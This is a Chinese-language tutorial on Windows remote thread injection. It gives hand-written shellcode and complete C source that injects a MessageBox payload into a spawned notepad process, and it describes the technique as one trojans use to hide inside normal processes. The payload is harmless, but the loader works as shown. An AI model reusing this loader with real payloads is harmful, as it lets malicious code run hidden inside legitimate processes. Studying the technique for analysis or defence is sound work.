一般情况下 进程之间相互隔离 无法访问内存空间 但是WIN 提供了 API `ReadProcessMemory`   `WriteProcessMemory` 和 `CreateRemoteThread`

举个例子：调试器和被调试进程 本质上也就是 相互隔离的 但是我们依旧可以访问被调试的内存

# 过程

1. 通过 `VirtualAllocEx` 在目标进程内存 申请空间
2. 通过 `WriteProcessMemory` 写入目标内存空间
3. 通过  `CreateRemoteThread` 创建线程 执行

这就是 病毒木马 经常使用的过程

1. 无法找到木马进程 通过任务管理器 只可以找到正常进程
2. 恶意代码寄生在线程中

# 编写ShellCode

我们首先遇见的问题是 我们如何把我们需要执行的内容 转为` bytes` 类型传入

我们需要弹出一个 `MessageBox` 

我们这里需要手写一个`Shellcode`

```
	__asm {
		pushad // 这个是保存当前所有寄存器的值 入栈
		mov eax, 0x75b30ad0 //这里需要自己去找到
		push 0
		push 0x47474747  //压入字符串
		push 0x47474747
		mov ebx, esp //把字符串的地址保存在 ebx中	
		//准备函数调用
		push 0
		push ebx
		push ebx
		push 0
		call eax
		add esp, 0x0C //平衡上面字符串的堆栈
		popad // 恢复寄存器的值
		ret 0 // 要满足的是入参（LPVOID）和返回地址的平栈
	}
```

这就是一个基本的汇编 调用`MessageBox`

我们如何去找到` MessageBox`呢 首先 我们需要通过`C:\\Windows\\SysWOW64\\notepad.exe` 这个路径去找32位的`notepad`

然后通过`Process Explorer`这个软件 确定其中`user32`基地址

![image-20260208191811085](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260208191811085.png)

最后查看我们写的程序内 `user32`的地址 是否一样

![image-20260208191910864](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260208191910864.png)

可以发现是一样的 说明我们可以直接 找到指针调用即可

```
00695412 FF 15 A0 B0 69 00    call        dword ptr [__imp__MessageBoxW@16 (069B0A0h)]  
```

找到指针 去取值 小端序

![image-20260208191951095](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260208191951095.png)

所以我们的`MessageBox`就是 `0x75b30ad0`

最后 抄出`shellcode` 也就是十六进制内容

这种工作丢给AI即可

```C++
unsigned char shellcode[] =
		"\x60"                          // pushad
		"\xB8\xD0\x0A\xB3\x75"          // mov eax, 0x75B30AD0
		"\x6A\x00"                      // push 0
		"\x68\x47\x47\x47\x47"          // push 0x47474747
		"\x68\x47\x47\x47\x47"          // push 0x47474747
		"\x8B\xDC"                      // mov ebx, esp
		"\x6A\x00"                      // push 0
		"\x53"                          // push ebx
		"\x53"                          // push ebx
		"\x6A\x00"                      // push 0
		"\xFF\xD0"                      // call eax
		"\x83\xC4\x0C"                  // add esp, 0x0C
		"\x61"	                        // popad
		"\xC2"							// ret 0
		"\x04"
		"\x00";
```



# 构建远程注入

```c++
int main() {

	//获取 进程ID 拿到目标函数句柄
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi; //这里保存句柄
	CreateProcess(TEXT("C:\\Windows\\SysWOW64\\notepad.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	
	// 申请内存
	LPVOID pRomoteMEM = VirtualAllocEx(
		pi.hProcess,
		NULL,
		100,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	// 写入代码
	DWORD WriteBytes = 0;
	WriteProcessMemory(
		pi.hProcess,
		pRomoteMEM,
		shellcode,
		sizeof(shellcode),
		&WriteBytes
	);
	//创建远程线程
	DWORD romoteThreadID = 0;
	HANDLE romoteThread = CreateRemoteThread(
		pi.hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)pRomoteMEM,
		0,
		0,
		&romoteThreadID
	);
	printf("返回注入线程ID为 %d", romoteThreadID);
	WaitForSingleObject(romoteThread, INFINITE); // 等待远程线程的结束
	CloseHandle(romoteThread);
	return 0;
}
```

步骤非常明确

现在开始执行

![image-20260208192353512](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260208192353512.png)

成功

# 完整代码

```c
#include <Windows.h>
#include <stdio.h>


unsigned char shellcode[] =
		"\x60"                          // pushad
		"\xB8\xD0\x0A\xB3\x75"          // mov eax, 0x75B30AD0
		"\x6A\x00"                      // push 0
		"\x68\x47\x47\x47\x47"          // push 0x47474747
		"\x68\x47\x47\x47\x47"          // push 0x47474747
		"\x8B\xDC"                      // mov ebx, esp
		"\x6A\x00"                      // push 0
		"\x53"                          // push ebx
		"\x53"                          // push ebx
		"\x6A\x00"                      // push 0
		"\xFF\xD0"                      // call eax
		"\x83\xC4\x0C"                  // add esp, 0x0C
		"\x61"	                        // popad
		"\xC2"							// ret 0
		"\x04"
		"\x00";

int main() {

	//获取 进程ID 拿到目标函数句柄
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi; //这里保存句柄
	CreateProcess(TEXT("C:\\Windows\\SysWOW64\\notepad.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	
	// 申请内存
	LPVOID pRomoteMEM = VirtualAllocEx(
		pi.hProcess,
		NULL,
		100,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	// 写入代码
	DWORD WriteBytes = 0;
	WriteProcessMemory(
		pi.hProcess,
		pRomoteMEM,
		shellcode,
		sizeof(shellcode),
		&WriteBytes
	);
	//创建远程线程
	DWORD romoteThreadID = 0;
	HANDLE romoteThread = CreateRemoteThread(
		pi.hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)pRomoteMEM,
		0,
		0,
		&romoteThreadID
	);
	printf("返回注入线程ID为 %d", romoteThreadID);
	WaitForSingleObject(romoteThread, INFINITE); // 等待远程线程的结束
	CloseHandle(romoteThread);
	return 0;
}
```

# 为什么需要ret

如果不写 那么我们点击`MessageBox`弹窗后 notepad 也会直接退出

我们在执行 `CreateRomoteThead`的时候 其实调用了

```
DWORD WINAPI ThreadProc(LPVOID lpParameter);
```

这是一个  **Windows 回调函数** 遵守 `stdcall` 约定 

流程如下：

1. 我们通过调用`CreateRomoteThead` 启动线程
2.  对弹窗点击 `OK` 
3. 这个线程需要结束 并且需要保证 进程继续执行
4. 由于`ThreadProc` 遵守  `stdcall` 约定 我们当前被执行函数 需要平衡 栈 返回 
5. 所以 我们需要 `ret 4` 

也就是说 我们的`shellcode` 当前是作为 被调用者 需要平衡调用者压入栈的内容

可以发现 这个方法很麻烦 简单的`MessageBox` 都如此麻烦 更何况复杂的木马 所以一般都是 `dll注入` 配合`远程注入` 实现

把复杂逻辑写入`dll`中 从而实现` 远程+DLL注入`